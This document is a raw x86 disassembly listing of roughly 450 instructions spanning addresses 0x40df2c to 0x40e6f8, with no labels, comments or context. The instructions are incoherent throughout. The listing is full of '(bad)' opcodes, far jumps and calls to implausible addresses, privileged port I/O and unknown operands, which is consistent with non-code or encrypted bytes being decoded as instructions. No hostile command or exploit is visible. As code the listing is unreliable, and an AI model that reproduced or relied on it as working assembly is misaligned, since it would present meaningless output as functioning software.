  40df2c:	jmp    0x7393:0x67800aba
  40df33:	pusha  
  40df34:	psllw  mm2,mm7
  40df37:	sbb    BYTE PTR [ebx-0x2a81201e],0xc0
  40df3e:	pop    ebp
  40df3f:	ss mov dl,0x66
  40df42:	jge    0x40deed
  40df44:	mov    ah,BYTE PTR [bx+si-0x77]
  40df48:	das    
  40df49:	xor    DWORD PTR [eax+ebp*4],0xd98325ae
  40df50:	jp     0x40dfbc
  40df52:	inc    eax
  40df53:	enter  0xf7d2,0x57
  40df57:	xor    DWORD PTR [ecx-0x451a414c],ecx
  40df5d:	mov    ds,WORD PTR [esi]
  40df5f:	xchg   DWORD PTR [esi],edi
  40df61:	mov    al,ds:0xfc99a0f7
  40df66:	jecxz  0x40dfe0
  40df68:	lds    ecx,FWORD PTR [eax-0x61]
  40df6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df6c:	mov    edx,0xd319a6c6
  40df71:	sbb    DWORD PTR [esi-0x32c1ccad],ebx
  40df77:	add    eax,0x122c617a
  40df7c:	push   edx
  40df7d:	jbe    0x40dfa6
  40df7f:	add    DWORD PTR [eax],eax
  40df81:	cmp    eax,0x15ff8a75
  40df86:	or     eax,0x6df945e5
  40df8b:	sub    bh,BYTE PTR [esi-0x36]
  40df8e:	mov    dl,0x4f
  40df90:	adc    al,0xfd
  40df92:	xor    DWORD PTR [edx+eax*2-0x65],ecx
  40df96:	pop    edi
  40df97:	add    BYTE PTR [ebx+0x6a],ch
  40df9a:	dec    edx
  40df9b:	sub    dl,BYTE PTR [ebp-0x5254eccb]
  40dfa1:	adc    BYTE PTR [edx-0x790c6c50],dh
  40dfa7:	jmp    0xc0642d5e
  40dfac:	xor    BYTE PTR [eax+0x77e506c0],0x64
  40dfb3:	inc    ecx
  40dfb4:	adc    al,0x2d
  40dfb6:	mov    ?,WORD PTR [edx-0x203eb043]
  40dfbc:	dec    ecx
  40dfbd:	xchg   ebp,eax
  40dfbe:	xor    eax,0xed46ab6d
  40dfc3:	fmulp  st(1),st
  40dfc5:	xor    dh,BYTE PTR [ebx+0x59]
  40dfc8:	push   0xe432dd28
  40dfcd:	fadd   DWORD PTR [ebp+0x8]
  40dfd0:	add    al,0x56
  40dfd2:	jns    0x40dfb4
  40dfd4:	or     dl,ch
  40dfd6:	pop    ds
  40dfd7:	add    BYTE PTR [eax+esi*8],ah
  40dfda:	push   ss
  40dfdb:	stc    
  40dfdc:	(bad)  
  40dfdd:	xor    DWORD PTR [ebp+0x53],ecx
  40dfe0:	add    DWORD PTR [esi-0x6d3e85e5],esi
  40dfe6:	hlt    
  40dfe7:	and    al,0xd
  40dfe9:	pop    ds
  40dfea:	mov    ebx,0x8c029793
  40dfef:	call   0xd7054a89
  40dff4:	nop
  40dff5:	sbb    ch,BYTE PTR [edx]
  40dff7:	(bad)  
  40dff8:	in     al,0x84
  40dffa:	test   BYTE PTR [esi-0x3e],ah
  40dffd:	loopne 0x40dfdd
  40dfff:	push   ebp
  40e000:	test   BYTE PTR [ebp-0x75],dl
  40e003:	sub    edx,DWORD PTR [ebp+0xf36ecfe]
  40e009:	sbb    esp,ecx
  40e00b:	push   ss
  40e00c:	bound  esi,QWORD PTR [ecx+0x4a105263]
  40e012:	dec    edx
  40e013:	jle    0x40dfa2
  40e015:	xor    BYTE PTR [eax+0x4367e6be],al
  40e01b:	je     0x40dfea
  40e01d:	push   0x96f19a3b
  40e022:	jne    0x40e019
  40e024:	mov    DWORD PTR [eax],0xb63537a7
  40e02a:	jmp    FWORD PTR [ecx]
  40e02c:	pop    ebx
  40e02d:	out    dx,al
  40e02e:	rcr    esi,1
  40e030:	xchg   esi,edi
  40e032:	dec    esi
  40e033:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e034:	or     DWORD PTR ds:0xbef0ae44,ebx
  40e03a:	mov    ebp,0xee976a42
  40e03f:	sbb    BYTE PTR [eax+ebx*4-0x48254699],ah
  40e046:	call   0x8c52ce86
  40e04b:	jecxz  0x40e0cc
  40e04d:	cld    
  40e04e:	aam    0x4a
  40e050:	cli    
  40e051:	inc    ebx
  40e052:	mov    eax,ds:0x1020c741
  40e057:	inc    edi
  40e058:	lahf   
  40e059:	jns    0x40e05c
  40e05b:	mov    bl,0x58
  40e05d:	dec    DWORD PTR [edx+0x2480c5f1]
  40e063:	and    BYTE PTR [ebx+0x28cf1a2],dl
  40e069:	add    ecx,ecx
  40e06b:	das    
  40e06c:	or     DWORD PTR ds:0x93f20df0,esi
  40e072:	mov    dh,0xa1
  40e074:	mov    bh,0x1c
  40e076:	aam    0xf0
  40e078:	ret    0x1518
  40e07b:	add    edi,DWORD PTR [ebx]
  40e07d:	jbe    0x40e043
  40e07f:	imul   BYTE PTR es:[edx]
  40e082:	test   DWORD PTR [ecx+eiz*2],0x87452632
  40e089:	xor    BYTE PTR [edx],0x11
  40e08c:	in     al,0x1f
  40e08e:	(bad)  
  40e08f:	push   ds
  40e090:	mov    ah,0x85
  40e092:	retf   
  40e093:	pop    esi
  40e094:	shl    DWORD PTR [eax],cl
  40e096:	and    al,0x91
  40e098:	cwde   
  40e099:	push   ecx
  40e09a:	xor    cl,0xf5
  40e09d:	jmp    0x5c24:0x1884aaef
  40e0a4:	or     al,0x73
  40e0a6:	shl    ebp,0x44
  40e0a9:	sub    dh,dl
  40e0ab:	inc    ebp
  40e0ac:	xchg   ebp,eax
  40e0ad:	adc    bh,BYTE PTR [edx]
  40e0af:	mov    esp,0xa485ef8e
  40e0b4:	mov    ch,0x2b
  40e0b6:	pop    ebp
  40e0b7:	jp     0x40e0cb
  40e0b9:	jne    0x40e0a4
  40e0bb:	mov    al,ds:0x4bcdbfff
  40e0c0:	ins    DWORD PTR es:[edi],dx
  40e0c1:	and    eax,DWORD PTR [edi+0x647e948a]
  40e0c7:	lds    esi,FWORD PTR [edi+0x51ebf218]
  40e0cd:	test   ah,dh
  40e0cf:	push   esi
  40e0d0:	call   0x7eccb56b
  40e0d5:	add    edi,ebx
  40e0d7:	xor    DWORD PTR [ecx],ebx
  40e0d9:	lahf   
  40e0da:	out    0xb2,eax
  40e0dc:	frstor [ebx]
  40e0de:	adc    edx,DWORD PTR [eax+0x9]
  40e0e1:	out    0xa4,eax
  40e0e3:	xor    esi,DWORD PTR [ebx+ebp*8-0x4c]
  40e0e7:	dec    esi
  40e0e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e0e9:	addr16 popa 
  40e0eb:	jb     0x40e090
  40e0ed:	lds    ebx,FWORD PTR [edi+0x4ad54e17]
  40e0f3:	adc    al,0x49
  40e0f5:	pop    esp
  40e0f6:	dec    ebx
  40e0f7:	push   ebx
  40e0f8:	mov    eax,ds:0x4f9a4ba5
  40e0fd:	int    0x2
  40e0ff:	sbb    al,dl
  40e101:	xchg   edx,eax
  40e102:	sub    BYTE PTR [ecx+eax*2],ch
  40e105:	aas    
  40e106:	inc    esi
  40e107:	sub    eax,0x1977d4f
  40e10c:	ror    DWORD PTR [ecx+eiz*4+0x31a82ffa],0x74
  40e114:	stos   BYTE PTR es:[edi],al
  40e115:	xor    DWORD PTR [esi-0x2f],ecx
  40e118:	ret    0xb3b5
  40e11b:	xor    edx,DWORD PTR ds:0xe0e40d6e
  40e121:	pusha  
  40e122:	je     0x40e0b1
  40e124:	xchg   esi,eax
  40e125:	into   
  40e126:	sbb    ch,bh
  40e128:	jb     0x40e18c
  40e12a:	imul   ebx,DWORD PTR [ebx],0xc9130947
  40e130:	inc    eax
  40e131:	sub    eax,0x2a445faa
  40e136:	int    0x9e
  40e138:	mov    dh,0x90
  40e13a:	sub    al,0xd9
  40e13c:	mov    BYTE PTR [edx+0x3b07fb31],0x60
  40e143:	fs sub al,0x6d
  40e146:	sub    DWORD PTR [eax+0x40c32726],0x6d
  40e14d:	push   es
  40e14e:	cwde   
  40e14f:	out    0x29,al
  40e151:	mov    eax,0xf2be825c
  40e156:	pop    ecx
  40e157:	nop
  40e158:	jnp    0x40e151
  40e15a:	test   eax,0x22ceb332
  40e15f:	xor    cl,BYTE PTR [ebx+0x59]
  40e162:	pop    ebx
  40e163:	loopne 0x40e1b2
  40e165:	cmp    BYTE PTR [ecx-0x2e],dh
  40e168:	ret    0xe85a
  40e16b:	dec    ebx
  40e16c:	pop    ss
  40e16d:	popf   
  40e16e:	bound  edx,QWORD PTR [ebp-0x5f03d8cb]
  40e174:	and    al,BYTE PTR [esp+eiz*4]
  40e177:	mov    esi,0x8fc4e749
  40e17c:	daa    
  40e17d:	push   edi
  40e17e:	add    DWORD PTR [edi+ebx*4+0x68345d28],0x51
  40e186:	push   edi
  40e187:	mov    ds:0xd3659e91,al
  40e18c:	add    bh,BYTE PTR [ebp+0xd535b6b]
  40e192:	xor    dl,bh
  40e194:	adc    ch,cl
  40e196:	cld    
  40e197:	js     0x40e1c3
  40e199:	dec    ebx
  40e19a:	and    edx,DWORD PTR [ecx-0x1a87930c]
  40e1a0:	inc    ebp
  40e1a1:	div    BYTE PTR [eax]
  40e1a3:	into   
  40e1a4:	fmul   DWORD PTR [ecx-0x4c06718f]
  40e1aa:	mov    dh,0x33
  40e1ac:	addr16 push eax
  40e1ae:	je     0x40e145
  40e1b0:	call   0x21fd:0xfc211b1d
  40e1b7:	xchg   ebx,eax
  40e1b8:	(bad)
  40e1bd:	or     BYTE PTR [edi-0x5e],cl
  40e1c0:	test   ebp,0x1d1f2f01
  40e1c6:	dec    ebx
  40e1c7:	fimul  WORD PTR [edi+0x57]
  40e1ca:	fisubr WORD PTR [edx+eiz*8+0x5b]
  40e1ce:	xor    DWORD PTR [edx+0x2f3503a],0xab20b9f4
  40e1d8:	jg     0x40e175
  40e1da:	lock dec esi
  40e1dc:	xor    esi,ebp
  40e1de:	xor    ebx,DWORD PTR [edx]
  40e1e0:	sub    eax,0x54803e17
  40e1e5:	adc    eax,0xb7adb8e
  40e1ea:	ficom  WORD PTR [esi+0x6a766226]
  40e1f0:	addr16 cmp al,0xa2
  40e1f3:	gs jecxz 0x40e231
  40e1f6:	in     al,dx
  40e1f7:	add    dl,BYTE PTR [esi-0x3c]
  40e1fa:	mov    eax,ds:0xf9a70051
  40e1ff:	push   esp
  40e200:	xacquire xchg DWORD PTR [esi+0x36],ecx
  40e204:	add    cl,bh
  40e206:	clc    
  40e207:	arpl   WORD PTR [esi-0x31],sp
  40e20a:	push   esi
  40e20b:	das    
  40e20c:	sahf   
  40e20d:	daa    
  40e20e:	pushf  
  40e20f:	retf   
  40e210:	add    esp,edx
  40e212:	and    ah,BYTE PTR [ebx]
  40e214:	and    eax,0xab72e646
  40e219:	dec    esi
  40e21a:	xchg   ebp,eax
  40e21b:	ret    0x555c
  40e21e:	sub    eax,0xe24219c
  40e223:	push   ebx
  40e224:	sbb    ebp,DWORD PTR [eax+0x3d403b27]
  40e22a:	xchg   ebx,eax
  40e22b:	lods   eax,DWORD PTR ds:[esi]
  40e22c:	add    DWORD PTR [edi],0xd4e2feb9
  40e232:	fdivr  DWORD PTR [ebp-0x27734687]
  40e238:	push   ds
  40e239:	add    eax,edx
  40e23b:	imul   ecx,DWORD PTR [edi+0xb],0x17
  40e23f:	imul   edx,DWORD PTR [eax-0x80],0xffffffd5
  40e243:	fisub  DWORD PTR [ebp+ebx*1-0x709ae92b]
  40e24a:	jge    0x40e24e
  40e24c:	push   ebp
  40e24d:	xor    BYTE PTR [ecx+eiz*1],ch
  40e250:	test   DWORD PTR [ebx+0x41],esi
  40e253:	inc    eax
  40e254:	push   0x3e5dd3c0
  40e259:	cmp    BYTE PTR [esi-0x2641a042],al
  40e25f:	adc    al,0xa5
  40e261:	inc    edi
  40e262:	and    BYTE PTR [eax+0xcaad322],ch
  40e268:	loopne 0x40e20b
  40e26a:	inc    eax
  40e26b:	pop    esi
  40e26c:	in     eax,dx
  40e26d:	xchg   edx,eax
  40e26e:	xor    esi,DWORD PTR [eax+0x1c5c959d]
  40e274:	test   al,0xd1
  40e277:	xor    al,0x15
  40e279:	jnp    0x40e20e
  40e27b:	mov    bh,0x6c
  40e27d:	retf   0x107d
  40e280:	sti    
  40e281:	call   0xe06dba9c
  40e286:	push   esi
  40e287:	or     DWORD PTR ds:0xc701d38f,eax
  40e28d:	std    
  40e28e:	xlat   BYTE PTR ds:[ebx]
  40e28f:	mov    DWORD PTR [ebx],0x4efff6af
  40e295:	xchg   esi,eax
  40e296:	imul   BYTE PTR [eax+0x48]
  40e299:	retf   
  40e29a:	popa   
  40e29b:	xor    eax,0x8e78196e
  40e2a0:	jp     0x40e31b
  40e2a2:	retf   0xb6b1
  40e2a5:	jnp    0x40e2f4
  40e2a7:	xchg   ebp,eax
  40e2a8:	test   BYTE PTR [eax+0x12de5aa4],dh
  40e2ae:	hlt    
  40e2af:	fisubr DWORD PTR [ebx-0x6d]
  40e2b2:	xchg   ebp,eax
  40e2b3:	pop    edi
  40e2b4:	aas    
  40e2b5:	cdq    
  40e2b6:	pop    esp
  40e2b7:	out    0x63,al
  40e2b9:	pusha  
  40e2ba:	cmc    
  40e2bb:	popf   
  40e2bc:	jnp    0x40e271
  40e2be:	sbb    ebx,esp
  40e2c0:	add    ebx,eax
  40e2c2:	cmp    eax,DWORD PTR [ecx]
  40e2c4:	or     BYTE PTR [ecx],ah
  40e2c6:	adc    dh,BYTE PTR [ebx]
  40e2c8:	clc    
  40e2c9:	xchg   ecx,eax
  40e2ca:	fidiv  DWORD PTR [eax]
  40e2cc:	popa   
  40e2cd:	mov    bl,0x3d
  40e2cf:	lea    ecx,[edx]
  40e2d1:	sbb    BYTE PTR [ecx],0x6
  40e2d4:	mov    edi,0x7430dc08
  40e2d9:	xchg   ecx,eax
  40e2da:	loopne 0x40e263
  40e2dc:	outs   dx,DWORD PTR ds:[esi]
  40e2dd:	mov    dh,0x7d
  40e2df:	popf   
  40e2e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e2e1:	push   es
  40e2e2:	enter  0xb53f,0x15
  40e2e6:	adc    esp,DWORD PTR [ecx-0x15e8a7cb]
  40e2ec:	add    BYTE PTR [ebx-0x7e],ah
  40e2ef:	cmp    cl,BYTE PTR [ecx+ecx*2-0x14]
  40e2f3:	push   esp
  40e2f4:	cmp    ch,al
  40e2f6:	or     al,0x43
  40e2f8:	dec    esi
  40e2f9:	inc    ebp
  40e2fa:	or     esi,DWORD PTR [eax+0x77]
  40e2fd:	lods   al,BYTE PTR ds:[esi]
  40e2fe:	(bad)  
  40e2ff:	lods   eax,DWORD PTR ds:[esi]
  40e300:	push   ebp
  40e301:	test   bl,0x1b
  40e304:	in     al,0xf0
  40e306:	imul   eax,DWORD PTR [eax],0x95628731
  40e30c:	xor    al,0xe3
  40e30e:	mov    ebp,0x817802a
  40e313:	cmp    edi,DWORD PTR [ecx+0x3f7b5146]
  40e319:	je     0x40e2e5
  40e31b:	(bad)  
  40e31c:	mov    edi,ebp
  40e31e:	addr16 pop ss
  40e320:	iret   
  40e321:	jb     0x40e34d
  40e323:	xchg   esp,eax
  40e324:	mov    eax,ds:0x8eeb3f2d
  40e329:	ret    
  40e32a:	inc    edi
  40e32b:	lods   eax,DWORD PTR ds:[esi]
  40e32c:	loope  0x40e376
  40e32e:	call   0x82906677
  40e333:	fld    QWORD PTR [esi+edi*8+0x6a]
  40e337:	aam    0xa5
  40e339:	jne    0x40e2c5
  40e33b:	test   BYTE PTR [ecx-0x6d],dh
  40e33e:	fld    DWORD PTR [esi+0x5f1499a9]
  40e344:	push   ss
  40e345:	test   al,0x84
  40e347:	cmp    eax,0x26f671d3
  40e34c:	mov    eax,ds:0xebaf6bc7
  40e351:	repz mov dl,0x68
  40e354:	cmp    al,0xc6
  40e356:	iret   
  40e357:	lock pop ds
  40e359:	cwde   
  40e35a:	int3   
  40e35b:	fs pop eax
  40e35d:	mov    esp,0x2a767f0
  40e362:	jno    0x40e33b
  40e364:	cmp    eax,0xbbd1d759
  40e369:	inc    esi
  40e36a:	call   0xfe74b78c
  40e36f:	jno    0x40e310
  40e371:	mov    ah,0x5d
  40e373:	xor    DWORD PTR [esi+eiz*1+0x26bc2a2b],esi
  40e37a:	add    eax,0x4e12a3eb
  40e37f:	loope  0x40e36e
  40e381:	dec    edx
  40e382:	xor    ebp,edi
  40e384:	test   edi,edx
  40e386:	jmp    0xe5ca:0x1a27a239
  40e38d:	(bad)  
  40e38e:	xlat   BYTE PTR ds:[ebx]
  40e38f:	inc    ecx
  40e390:	imul   eax,DWORD PTR [ecx+eiz*1],0xedaed49e
  40e397:	test   eax,0xb413b59d
  40e39c:	aaa    
  40e39d:	test   eax,0xd8ab2e63
  40e3a2:	dec    esi
  40e3a3:	jb     0x40e3c4
  40e3a5:	hlt    
  40e3a6:	dec    edi
  40e3a7:	xor    ebp,DWORD PTR [esi]
  40e3a9:	adc    ecx,DWORD PTR [ecx-0x6c9e0fc]
  40e3af:	or     DWORD PTR [ebx-0x76],edi
  40e3b2:	push   ebp
  40e3b3:	clc    
  40e3b4:	mov    bh,0xc9
  40e3b6:	sub    DWORD PTR [edx+0x70b753b0],esi
  40e3bc:	js     0x40e413
  40e3be:	push   0xe3a5a895
  40e3c3:	aad    0x7e
  40e3c5:	scas   eax,DWORD PTR es:[edi]
  40e3c6:	jb     0x40e3e7
  40e3c8:	or     eax,0xd64c00ea
  40e3cd:	add    BYTE PTR [ebx],ch
  40e3cf:	sbb    eax,0xf1d4fd14
  40e3d4:	mov    ds:0xe124a875,eax
  40e3d9:	loope  0x40e401
  40e3db:	push   ebx
  40e3dc:	push   ebp
  40e3dd:	(bad)  
  40e3de:	push   eax
  40e3df:	out    dx,eax
  40e3e0:	out    0x4f,eax
  40e3e2:	test   al,0x17
  40e3e4:	mov    al,ds:0xd340508c
  40e3e9:	sbb    eax,0x32d4269e
  40e3ee:	div    BYTE PTR [edx]
  40e3f0:	aaa    
  40e3f1:	and    edx,DWORD PTR [ebx+0x5f9fde27]
  40e3f7:	pop    ebp
  40e3f8:	pop    ecx
  40e3f9:	test   bl,0x50
  40e3fc:	sbb    eax,0xa93e8eaa
  40e401:	dec    esi
  40e402:	cwde   
  40e403:	xor    BYTE PTR [ebx],ah
  40e405:	pop    eax
  40e406:	loope  0x40e3ca
  40e408:	sbb    eax,0xc02e46f3
  40e40d:	xchg   bl,dl
  40e40f:	rcr    BYTE PTR [eax+0x45b90d6e],0x47
  40e416:	sub    al,BYTE PTR [edx]
  40e418:	xchg   ebp,eax
  40e419:	xlat   BYTE PTR ds:[ebx]
  40e41a:	enter  0x1597,0x4c
  40e41e:	fdiv   DWORD PTR [edx+0x57]
  40e421:	(bad)  
  40e422:	out    0x85,eax
  40e424:	in     al,0xf1
  40e426:	jle    0x40e48b
  40e428:	cdq    
  40e429:	sub    esp,eax
  40e42b:	mov    ah,0x3a
  40e42d:	je     0x40e494
  40e42f:	outs   dx,BYTE PTR cs:[esi]
  40e431:	call   DWORD PTR [edi+0x653f7275]
  40e437:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e438:	jl     0x40e3cb
  40e43a:	out    0x5c,eax
  40e43c:	and    eax,0xeb9bd6ee
  40e441:	pop    esi
  40e442:	adc    DWORD PTR [eax-0x79427b57],ecx
  40e448:	mov    ah,0x33
  40e44a:	cli    
  40e44b:	gs push es
  40e44d:	and    edx,DWORD PTR [esi]
  40e44f:	fstp   DWORD PTR [edi-0x7d]
  40e452:	sbb    edi,esi
  40e454:	jns    0x40e44b
  40e456:	inc    eax
  40e457:	jno    0x40e3e3
  40e459:	test   DWORD PTR [eax+0x13],esi
  40e45c:	in     al,dx
  40e45d:	push   ss
  40e45e:	bound  eax,QWORD PTR [edi+0x7160f4c1]
  40e464:	xor    eax,DWORD PTR [esi+0x59e6c669]
  40e46a:	ds jmp 0x302450e3
  40e470:	test   eax,0x4b968c22
  40e475:	in     eax,dx
  40e476:	ins    DWORD PTR es:[edi],dx
  40e477:	pop    ebx
  40e478:	stc    
  40e479:	fcmovb st,st(5)
  40e47b:	push   cs
  40e47c:	mov    eax,0x894833a8
  40e481:	xchg   edi,eax
  40e482:	adc    BYTE PTR [ecx],dl
  40e484:	mov    dh,BYTE PTR [esi+0x242b77ef]
  40e48a:	unpcklps xmm1,xmm4
  40e48d:	nop
  40e48e:	dec    eax
  40e48f:	xchg   edi,eax
  40e490:	and    DWORD PTR [esi+0x11374245],0x9214fdaf
  40e49a:	aam    0x96
  40e49c:	inc    esi
  40e49d:	sbb    dh,ah
  40e49f:	popf   
  40e4a0:	jecxz  0x40e492
  40e4a2:	loope  0x40e47a
  40e4a4:	into   
  40e4a5:	int3   
  40e4a6:	dec    ecx
  40e4a7:	inc    eax
  40e4a8:	mov    ah,0x3a
  40e4aa:	jmp    0x40e4ff
  40e4ac:	push   0x9037f238
  40e4b1:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  40e4b3:	or     al,0xaf
  40e4b5:	jmp    0xf4cea27
  40e4ba:	sub    BYTE PTR [ebx+0x68490328],cl
  40e4c0:	mov    edx,0x2f7589d8
  40e4c5:	popa   
  40e4c6:	add    ebp,esp
  40e4c8:	cli    
  40e4c9:	xchg   edx,eax
  40e4ca:	and    ecx,DWORD PTR ds:0x8cc06b9
  40e4d0:	idiv   BYTE PTR [ebx]
  40e4d2:	cld    
  40e4d3:	xchg   ebp,eax
  40e4d4:	cdq    
  40e4d5:	xor    DWORD PTR [ebp-0x33],edx
  40e4d8:	into   
  40e4d9:	shr    BYTE PTR [eax],1
  40e4db:	jmp    0x218e:0xeffc1cb6
  40e4e2:	in     eax,dx
  40e4e3:	inc    esp
  40e4e4:	adc    al,0x53
  40e4e6:	push   edx
  40e4e7:	cli    
  40e4e8:	mov    bl,0x93
  40e4ea:	sub    eax,0x94ad9f66
  40e4f0:	daa    
  40e4f1:	stc    
  40e4f2:	loope  0x40e4ee
  40e4f4:	add    eax,0xc09df7b7
  40e4f9:	inc    ebp
  40e4fa:	out    0xc,al
  40e4fc:	and    eax,0x12e304d2
  40e501:	nop
  40e502:	jnp    0x40e495
  40e504:	jne    0x40e530
  40e506:	push   0xffffff8e
  40e508:	or     BYTE PTR [esi-0x19],dh
  40e50b:	xchg   esp,eax
  40e50c:	push   esi
  40e50d:	scas   eax,DWORD PTR es:[edi]
  40e50e:	jb     0x40e53d
  40e510:	xchg   esi,eax
  40e511:	sub    BYTE PTR [edi+0x4c404a1e],bl
  40e517:	shl    ebp,0x3e
  40e51a:	adc    BYTE PTR [eax-0x3fac9d39],cl
  40e520:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e521:	hlt    
  40e522:	adc    eax,0x62b6137a
  40e527:	ins    DWORD PTR es:[edi],dx
  40e528:	div    DWORD PTR [ebx-0x48]
  40e52b:	mov    ebx,0xccdf3072
  40e530:	add    esp,eax
  40e532:	int3   
  40e533:	mov    bh,0x4c
  40e535:	in     eax,dx
  40e536:	add    al,0xad
  40e538:	gs stos DWORD PTR es:[edi],eax
  40e53a:	pop    ds
  40e53b:	sub    dh,bh
  40e53d:	enter  0xaa50,0xd9
  40e541:	mov    dh,0x11
  40e543:	ret    0xf1e7
  40e546:	frstor [edi-0x132fdaca]
  40e54c:	and    al,0xbb
  40e54e:	in     al,dx
  40e54f:	aaa    
  40e550:	sbb    DWORD PTR [ecx-0x44],edi
  40e553:	mov    DWORD PTR [ecx+0x26],edi
  40e556:	mov    bh,0x41
  40e558:	or     ah,BYTE PTR [esi+0x4f]
  40e55b:	xchg   DWORD PTR [eax-0x4],edx
  40e55e:	test   ah,al
  40e560:	adc    eax,0x2ea87b75
  40e565:	cwde   
  40e566:	jbe    0x40e5df
  40e568:	mov    ?,WORD PTR [ebp+eiz*8+0x79e2b278]
  40e56f:	push   0x38e4c37e
  40e574:	mov    edi,0x898f1b8d
  40e579:	pop    ebp
  40e57a:	repnz (bad)
  40e57d:	(bad)  
  40e57e:	outs   dx,DWORD PTR ds:[esi]
  40e57f:	cmp    dl,BYTE PTR [ebx-0x6]
  40e582:	sbb    BYTE PTR [ebp+0x48206b67],bh
  40e588:	sbb    BYTE PTR [ebx+0x70],0xc1
  40e58c:	pop    ss
  40e58d:	imul   esp,DWORD PTR [ebx-0x115c001e],0xc1d4e718
  40e597:	out    0x26,eax
  40e599:	aas    
  40e59a:	mov    dl,0x79
  40e59c:	and    al,0x3
  40e59e:	xor    al,0x28
  40e5a0:	into   
  40e5a1:	sti    
  40e5a2:	sahf   
  40e5a3:	xchg   ebp,eax
  40e5a4:	jp     0x40e61e
  40e5a6:	mov    ebp,0xda182f4a
  40e5ab:	shr    DWORD PTR [esi+0x7b],0xaf
  40e5af:	nop
  40e5b0:	rcl    BYTE PTR [ecx+edi*8],0x15
  40e5b4:	mov    ch,0xba
  40e5b6:	call   0x9d9322a8
  40e5bb:	rcl    BYTE PTR ds:[ebx-0x3c],0x2b
  40e5c0:	pop    ds
  40e5c1:	loopne 0x40e560
  40e5c3:	loopne 0x40e5cd
  40e5c5:	clc    
  40e5c6:	pop    esi
  40e5c7:	dec    ebp
  40e5c8:	jae    0x40e63b
  40e5ca:	and    al,0x54
  40e5cc:	sub    ebx,0x3f
  40e5cf:	mov    eax,ds:0x7ea5ce67
  40e5d4:	sbb    esi,esp
  40e5d6:	fistp  QWORD PTR [ebx+0x42f42f93]
  40e5dc:	or     eax,0x7388d43e
  40e5e1:	mov    ah,0x6
  40e5e3:	xor    ah,BYTE PTR [eax-0x76fa88e1]
  40e5e9:	adc    eax,DWORD PTR [edi-0x573b3b2]
  40e5ef:	mov    ah,0x32
  40e5f1:	gs je  0x40e580
  40e5f4:	std    
  40e5f5:	xchg   bh,al
  40e5f7:	fldenv [esi]
  40e5f9:	mov    esp,eax
  40e5fb:	(bad)  
  40e5fd:	jmp    0xc7898c4
  40e602:	xlat   BYTE PTR ds:[ebx]
  40e603:	jb     0x40e5b3
  40e605:	popf   
  40e606:	jbe    0x40e657
  40e608:	bswap  esi
  40e60a:	sbb    dl,BYTE PTR [esp+edi*1]
  40e60d:	nop
  40e60e:	mov    ebx,0x7c4093b4
  40e613:	not    DWORD PTR [ecx-0x4f5e0e9c]
  40e619:	mov    ebp,0x2c7e8278
  40e61e:	in     eax,dx
  40e61f:	mov    gs,esp
  40e621:	(bad)  
  40e622:	sar    ebx,cl
  40e624:	mov    dh,BYTE PTR [edi]
  40e626:	mov    ds:0x79b0f14,al
  40e62b:	cwde   
  40e62c:	push   ebp
  40e62d:	mov    ebx,0xef4f0e4
  40e632:	xchg   ebp,eax
  40e633:	xor    BYTE PTR [edi-0x37],0xe9
  40e637:	xchg   ebp,eax
  40e638:	shl    BYTE PTR [eax-0x75b1e900],cl
  40e63e:	mov    DWORD PTR [esi],ebx
  40e640:	pop    ebp
  40e641:	repz pop ss
  40e643:	add    BYTE PTR [esi-0xb],cl
  40e646:	sbb    DWORD PTR [esp+ebp*2+0x7c478e98],edi
  40e64d:	inc    esp
  40e64e:	(bad)  [esi-0x509e1246]
  40e654:	aam    0xd3
  40e656:	pop    edi
  40e657:	xchg   ah,ah
  40e659:	sub    bl,bl
  40e65b:	push   ds
  40e65c:	stos   BYTE PTR es:[edi],al
  40e65d:	test   WORD PTR fs:[edi],bp
  40e661:	jp     0x40e667
  40e663:	dec    eax
  40e664:	mov    DWORD PTR [ebp+0x52],esi
  40e667:	rcl    al,cl
  40e669:	imul   ebx,DWORD PTR [ebx-0x2b],0xffffff87
  40e66d:	xchg   BYTE PTR [ecx+0x35],cl
  40e670:	adc    ecx,DWORD PTR [edx-0x545b25d7]
  40e676:	add    BYTE PTR [edx-0xd048a4],ch
  40e67c:	mov    cl,0x51
  40e67e:	or     DWORD PTR [ebx],esp
  40e680:	arpl   WORD PTR [ebx],cx
  40e682:	repz jmp 0x7a5d1fd1
  40e688:	or     ecx,DWORD PTR [edi-0x3a]
  40e68b:	push   eax
  40e68c:	sahf   
  40e68d:	cmp    eax,0xe8417863
  40e692:	or     al,0xb9
  40e694:	ins    DWORD PTR es:[edi],dx
  40e695:	(bad)  
  40e696:	jp     0x40e659
  40e698:	in     al,dx
  40e699:	pop    es
  40e69a:	ja     0x40e6e6
  40e69c:	dec    esp
  40e69d:	imul   edi,eax,0xf
  40e6a0:	aad    0xa0
  40e6a2:	outs   dx,BYTE PTR ds:[esi]
  40e6a3:	push   eax
  40e6a4:	stc    
  40e6a5:	loop   0x40e647
  40e6a7:	iret   
  40e6a8:	and    DWORD PTR [edi+esi*8],ecx
  40e6ab:	jns    0x40e6e7
  40e6ad:	cmp    edx,ebp
  40e6af:	test   eax,0xf25c3d4a
  40e6b4:	cld    
  40e6b5:	test   al,0xb1
  40e6b7:	push   ecx
  40e6b8:	loop   0x40e66d
  40e6ba:	ret    0xdf9a
  40e6bd:	jmp    0xb42e906e
  40e6c2:	pushf  
  40e6c3:	lds    eax,FWORD PTR [ebx]
  40e6c5:	fnstenv [ebp-0x5f]
  40e6c8:	cld    
  40e6c9:	add    bl,BYTE PTR [ecx+ebp*8]
  40e6cc:	pop    eax
  40e6cd:	pop    edx
  40e6ce:	arpl   WORD PTR [esi],cx
  40e6d0:	jb     0x40e6fa
  40e6d2:	ins    DWORD PTR es:[edi],dx
  40e6d3:	outs   dx,DWORD PTR ds:[esi]
  40e6d4:	std    
  40e6d5:	stos   DWORD PTR es:[edi],eax
  40e6d6:	mov    al,0x32
  40e6d8:	es (bad) 
  40e6db:	cmp    bh,bh
  40e6dd:	or     al,0xe0
  40e6df:	hlt    
  40e6e0:	adc    eax,0x14a40ccc
  40e6e5:	icebp  
  40e6e6:	sbb    eax,0x13def90e
  40e6eb:	(bad)  
  40e6ed:	sbb    eax,0xacf802fa
  40e6f2:	jmp    DWORD PTR [esi-0x49edc4b5]
  40e6f8:	or     eax,0x33ac126e
